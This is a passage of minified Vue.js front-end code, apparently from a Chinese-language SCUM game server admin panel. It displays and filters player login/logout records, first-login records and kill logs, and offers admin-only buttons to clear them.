66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空登录退出记录列表吗?这会导致所有登录退出奖励重新结算!"},on:{confirm:e.cleanUserLogin}},[i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空所有登录退出记录")])],1)]:e._e(),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserLoginListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserLoginListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],2),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userLoginListFilter.steamId,callback:function(t){e.$set(e.userLoginListFilter,"steamId",t)},expression:"userLoginListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("商城用户名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userLoginListFilter.userName,callback:function(t){e.$set(e.userLoginListFilter,"userName",t)},expression:"userLoginListFilter.userName"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userLoginListFilter.scumId,callback:function(t){e.$set(e.userLoginListFilter,"scumId",t)},expression:"userLoginListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("记录状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.userLoginListFilter.type,callback:function(t){e.$set(e.userLoginListFilter,"type",t)},expression:"userLoginListFilter.type"}},e._l(e.typeList,(function(t){return i("a-select-option",{key:t.value,attrs:{title:t.label}},[e._v(e._s(t.label))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("登入时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.userLoginListFilter.timestampStart,e.userLoginListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.userLoginListFilter,"timestampStart",t[0]),e.$set(e.userLoginListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.userLoginListColumns,"data-source":e.userLoginListData,expandedRowKeys:e.expandedUserLoginIds,"row-key":"id",pagination:!1,loading:e.loadingUserLoginListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedUserLoginIds.find((function(e){return e===i.id}))&&e.expandedUserLoginIds.push(i.id);else{var a=Object.keys(e.expandedUserLoginIds).find((function(t){return e.expandedUserLoginIds[t]===i.id}));void 0!==a&&e.expandedUserLoginIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t,a){return[i("span",{style:{color:a.otherConfig&&!0===a.otherConfig.illegalDrone?"#f5222d":"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",{style:{color:a.otherConfig&&!0===a.otherConfig.illegalDrone?"#f5222d":"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))]),a.userLoginUser&&a.userLoginUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.userLoginUser.userName}})}}},[e._v("("+e._s(a.userLoginUser.userName)+")")]):e._e(),a.otherConfig&&!0===a.otherConfig.asDrone?i("a-icon",{staticStyle:{"margin-left":"3px"},style:{color:a.otherConfig&&!0===a.otherConfig.illegalDrone?"#f5222d":"login"===a.status?"#52c41a":"black"},attrs:{type:"robot"}}):e._e()]}},{key:"loginTimeStamp",fn:function(t,a){return[i("span",{style:{color:a.otherConfig&&!0===a.otherConfig.illegalDrone?"#f5222d":"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"logoutTimeStamp",fn:function(t,a){return[i("span",{style:{color:a.otherConfig&&!0===a.otherConfig.illegalDrone?"#f5222d":"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"status",fn:function(t){return[i("a-tag",{attrs:{color:void 0!==e.typeList.find((function(e){return e.value===t}))?e.typeList.find((function(e){return e.value===t})).color:"grey"}},[e._v(" "+e._s(void 0!==e.typeList.find((function(e){return e.value===t}))?e.typeList.find((function(e){return e.value===t})).label:t)+" ")])]}},{key:"loginIp",fn:function(t,a){return[i("span",{style:{color:a.otherConfig&&!0===a.otherConfig.illegalDrone?"#f5222d":"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))])]}},{key:"sessionId",fn:function(t,a){return[i("span",{style:{color:a.otherConfig&&!0===a.otherConfig.illegalDrone?"#f5222d":"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedUserLoginIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),t.otherConfig?[!t.otherConfig||void 0===t.otherConfig.asDrone&&void 0===t.otherConfig.illegalDrone?e._e():[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("管理权限相关信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("登录形态:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(!0===t.otherConfig.asDrone?"无人机":"玩家"))])]),t.otherConfig&&!0===t.otherConfig.illegalDrone?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("违规嫌疑:")]),i("strong",{staticStyle:{color:"#f5222d","margin-left":"10px"}},[e._v("该玩家无服务器管理员身份且尝试以无人机形态登录")])]):e._e()],t.otherConfig&&void 0!==t.otherConfig.loginLocations&&void 0!==t.otherConfig.loginArea?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("登录坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("登录坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.loginLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.loginArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.loginLocations}})],1)]:e._e(),t.otherConfig&&void 0!==t.otherConfig.logoutLocations&&void 0!==t.otherConfig.logoutArea?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("退出坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("退出坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.logoutLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.logoutArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.logoutLocations}})],1)]:e._e()]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.userLoginListPagination.pageSize,current:e.userLoginListPagination.pageNum,total:e.userLoginListPagination.total},on:{change:e.onChangeUserLoginListPagination,showSizeChange:e.onShowSizeChangeUserLoginListPagination}})],1)])])}),[],!1,null,"87a0b932",null),Ct=Tt.exports,Ft={name:"All",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingUserLoginInitListTable:!1,userLoginInitListFilter:{steamId:void 0,scumId:void 0,loginIp:void 0,source:void 0,timestampStart:void 0,timestampEnd:void 0},userLoginInitListColumns:[{title:"Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"SCUM玩家名称",key:"scumId",dataIndex:"scumId",width:160,align:"center",scopedSlots:{customRender:"scumId"}},{title:"玩家登录IP地址",key:"loginIp",dataIndex:"loginIp",width:150,align:"center",scopedSlots:{customRender:"loginIp"}},{title:"数据来源",key:"source",dataIndex:"source",width:100,align:"center",scopedSlots:{customRender:"source"}},{title:"记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],userLoginInitListData:[],userLoginInitListPagination:{pageSize:20,pageNum:1,total:0},sourceList:[{value:"normal",label:"正常计算记录",color:"green"},{value:"history",label:"历史数据整理记录",color:"grey"}]}},mounted:function(){this.getUserLoginInitList()},methods:{onUserLoginInitListCleanFilter:function(){var e=this;this.userLoginInitListPagination.pageNum=1,this.$nextTick((function(){e.getUserLoginInitList(!0)}))},onUserLoginInitListFilter:function(){var e=this;this.userLoginInitListPagination.pageNum=1,this.$nextTick((function(){e.getUserLoginInitList()}))},onChangeUserLoginInitListPagination:function(e){var t=this;this.userLoginInitListPagination.pageNum=e,this.$nextTick((function(){t.getUserLoginInitList()}))},onShowSizeChangeUserLoginInitListPagination:function(e,t){var i=this;this.userLoginInitListPagination.pageNum=1,this.userLoginInitListPagination.pageSize=t,this.$nextTick((function(){i.getUserLoginInitList()}))},getUserLoginInitList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.userLoginInitListPagination,n=a.pageNum,r=a.pageSize,e?(t.userLoginInitListFilter={steamId:void 0,scumId:void 0,loginIp:void 0,source:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.userLoginInitListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingUserLoginInitListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/userAdminSys/listUserLoginInit",params:o});case 6:c=i.sent,t.loadingUserLoginInitListTable=!1,200===c.status&&(t.userLoginInitListPagination.total=c.data.count,t.userLoginInitListData=c.data.list),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingUserLoginInitListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},cleanUserLoginInit:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/userAdminSys/cleanAllUserLoginInit"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getUserLoginInitList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Rt=Ft,Et=Object(S.a)(Rt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空用户初始登录记录列表吗?这会导致所有留存档案丢失，所有玩家下次登录都会被当做新手玩家传送到设置的指定地点(如开启)!"},on:{confirm:e.cleanUserLoginInit}},[i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空所有用户初始登录记录")])],1)]:e._e(),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserLoginInitListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserLoginInitListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],2),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userLoginInitListFilter.steamId,callback:function(t){e.$set(e.userLoginInitListFilter,"steamId",t)},expression:"userLoginInitListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userLoginInitListFilter.scumId,callback:function(t){e.$set(e.userLoginInitListFilter,"scumId",t)},expression:"userLoginInitListFilter.scumId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("登录IP地址:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userLoginInitListFilter.loginIp,callback:function(t){e.$set(e.userLoginInitListFilter,"loginIp",t)},expression:"userLoginInitListFilter.loginIp"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("记录来源:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.userLoginInitListFilter.source,callback:function(t){e.$set(e.userLoginInitListFilter,"source",t)},expression:"userLoginInitListFilter.source"}},e._l(e.sourceList,(function(t){return i("a-select-option",{key:t.value,attrs:{title:t.label}},[e._v(e._s(t.label))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("登入时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.userLoginInitListFilter.timestampStart,e.userLoginInitListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.userLoginInitListFilter,"timestampStart",t[0]),e.$set(e.userLoginInitListFilter,"timestampEnd",t[1])}}})],1)])],1),i("div",{staticStyle:{"margin-bottom":"10px"}},[i("div",{staticStyle:{"margin-bottom":"5px"}},[i("a-tag",{attrs:{color:"green"}},[e._v("正常计算记录")]),e._v("- 正常登录退出结算得到的记录")],1),i("div",[i("a-tag",{attrs:{color:"grey"}},[e._v("历史数据整理记录")]),e._v("- 根据过往的登录退出和商城会员注册记录整理得来，可能不准确")],1)]),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.userLoginInitListColumns,"data-source":e.userLoginInitListData,"row-key":"id",pagination:!1,loading:e.loadingUserLoginInitListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"loginIp",fn:function(t){return[i("span",[e._v(e._s(t||"-"))])]}},{key:"scumId",fn:function(t){return[i("span",[e._v(e._s(t||"-"))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"source",fn:function(t){return[i("a-tag",{attrs:{color:void 0!==e.sourceList.find((function(e){return e.value===t}))?e.sourceList.find((function(e){return e.value===t})).color:"grey"}},[e._v(" "+e._s(void 0!==e.sourceList.find((function(e){return e.value===t}))?e.sourceList.find((function(e){return e.value===t})).label:t)+" ")])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.userLoginInitListPagination.pageSize,current:e.userLoginInitListPagination.pageNum,total:e.userLoginInitListPagination.total},on:{change:e.onChangeUserLoginInitListPagination,showSizeChange:e.onShowSizeChangeUserLoginInitListPagination}})],1)])])}),[],!1,null,"3d31d4ee",null),Pt=Et.exports,At={name:"StoryLines",components:{All:Ct,Init:Pt},data:function(){return{currentTab:"all"}},mounted:function(){this.$route.query.category?this.currentTab=this.$route.query.category:(this.$router.push({path:"/user-login",query:Object(s.a)(Object(s.a)({},this.$route.query),{},{category:"all"})}),this.currentTab="all")},methods:{}},Dt=At,$t=Object(S.a)(Dt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"登录退出记录列表"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-tabs",{attrs:{type:"card"},on:{change:function(t){e.$router.push({path:"/user-login",query:{category:t}})}},model:{value:e.currentTab,callback:function(t){e.currentTab=t},expression:"currentTab"}},[i("a-tab-pane",{key:"all",attrs:{tab:"全部登录退出记录"}},["all"===e.currentTab?i("All"):e._e()],1),i("a-tab-pane",{key:"init",attrs:{tab:"最初登录游戏记录"}},["init"===e.currentTab?i("Init"):e._e()],1)],1)],1)])],1)}),[],!1,null,"55e70392",null),Ut=$t.exports,Nt={name:"Kill",components:{MapLocations:J},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingKillListTable:!1,killListFilter:{killerSteamId:void 0,killerName:void 0,killerArea:void 0,victimSteamId:void 0,victimName:void 0,victimArea:void 0,weapon:void 0,isEventKill:void 0,timestampStart:void 0,timestampEnd:void 0},killListColumns:[{title:"击杀者Steam ID",key:"killerSteamId",dataIndex:"killerSteamId",width:150,align:"center",scopedSlots:{customRender:"killerSteamId"}},{title:"击杀者游戏名称",key:"killerName",dataIndex:"killerName",width:180,align:"center",scopedSlots:{customRender:"killerName"}},{title:"击杀者坐标(区域)",key:"killerLocationsArea",dataIndex:"killerLocationsArea",width:180,align:"center",scopedSlots:{customRender:"killerLocationsArea"}},{title:"被击杀者Steam ID",key:"victimSteamId",dataIndex:"victimSteamId",width:150,align:"center",scopedSlots:{customRender:"victimSteamId"}},{title:"被击杀者游戏名称",key:"victimName",dataIndex:"victimName",width:180,align:"center",scopedSlots:{customRender:"victimName"}},{title:"被击杀者坐标(区域)",key:"victimLocationsArea",dataIndex:"victimLocationsArea",width:180,align:"center",scopedSlots:{customRender:"victimLocationsArea"}},{title:"击杀武器",key:"weapon",dataIndex:"weapon",width:200,align:"center",scopedSlots:{customRender:"weapon"}},{title:"击杀距离(立体距离)",key:"distance",dataIndex:"distance",width:150,align:"center",scopedSlots:{customRender:"distance"}},{title:"是否活动击杀",key:"isEventKill",dataIndex:"isEventKill",width:80,align:"center",scopedSlots:{customRender:"isEventKill"}},{title:"击杀时间",key:"occuredTimeStamp",dataIndex:"occuredTimeStamp",width:150,align:"center",scopedSlots:{customRender:"occuredTimeStamp"}}],killListData:[],killListPagination:{pageSize:20,pageNum:1,total:0},expandedKillIds:[],gameArealList:[],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getKillList()},methods:{onKillListCleanFilter:function(){var e=this;this.killListPagination.pageNum=1,this.$nextTick((function(){e.getKillList(!0)}))},onKillListFilter:function(){var e=this;this.killListPagination.pageNum=1,this.$nextTick((function(){e.getKillList()}))},onChangeKillListPagination:function(e){var t=this;this.killListPagination.pageNum=e,this.$nextTick((function(){t.getKillList()}))},onShowSizeChangeKillListPagination:function(e,t){var i=this;this.killListPagination.pageNum=1,this.killListPagination.pageSize=t,this.$nextTick((function(){i.getKillList()}))},getKillList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.killListPagination,n=a.pageNum,r=a.pageSize,e?(t.killListFilter={killerSteamId:void 0,killerName:void 0,killerArea:void 0,victimSteamId:void 0,victimName:void 0,victimArea:void 0,weapon:void 0,isEventKill:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):((l=Object(A.cloneDeep)(t.killListFilter)).isEventKill="true"===l.isEventKill||"false"!==l.isEventKill&&void 0,void 0!==l.timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingKillListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/killAdminSys/list",params:o});case 6:c=i.sent,t.loadingKillListTable=!1,200===c.status&&(t.killListPagination.total=c.data.count,t.killListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingKillListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.killListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},cleanKillRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/killAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getKillList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Mt=Nt,zt=Object(S.a)(Mt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"击杀记录列表"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("template",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},slot:"extra"},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空击杀记录列表吗?这会导致所有击杀奖惩重新结算!"},on:{confirm:e.cleanKillRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空击杀记录")])],1)],1):e._e()],2),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onKillListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onKillListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("击杀者Steam 